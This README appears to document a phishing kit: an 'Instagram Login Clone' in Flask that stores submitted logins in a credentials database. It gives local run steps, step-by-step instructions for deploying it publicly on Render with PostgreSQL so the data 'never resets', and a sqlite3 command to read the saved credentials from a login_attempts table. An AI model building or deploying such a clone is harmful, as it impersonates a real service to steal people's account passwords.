# Instagram Login Clone — Flask + PostgreSQL + Render

## File Structure
```
instagram_pg/
├── app.py
├── Procfile
├── requirements.txt
├── .gitignore
├── README.md
└── templates/
    └── login.html
```

## Run Locally (uses SQLite automatically)
```bash
pip install flask gunicorn psycopg2-binary
python app.py
```
Open: http://127.0.0.1:5000

No DATABASE_URL set locally → SQLite is used automatically.

---

## Deploy on Render (PostgreSQL)

### Step 1 — Push to GitHub
Push this entire folder to a GitHub repo.

### Step 2 — Create PostgreSQL Database on Render
1. Go to https://render.com → New → PostgreSQL
2. Name it: instagram-db
3. Click Create Database
4. Copy the Internal Database URL

### Step 3 — Create Web Service on Render
1. Go to Render → New → Web Service
2. Connect your GitHub repo
3. Set the following:
   - Environment: Python
   - Build Command: pip install -r requirements.txt
   - Start Command: gunicorn app:app

### Step 4 — Add Environment Variable
In your Web Service → Environment tab:
- Key:   DATABASE_URL
- Value: (paste the Internal Database URL from Step 2)

### Step 5 — Deploy
Click Deploy. Done!

---

## How it works
- Local: SQLite (credentials.db, auto-created)
- Render: PostgreSQL (permanent, never resets)
- app.py auto-detects DATABASE_URL and switches DB accordingly

## View saved credentials (local)
```bash
sqlite3 credentials.db "SELECT * FROM login_attempts;"
```
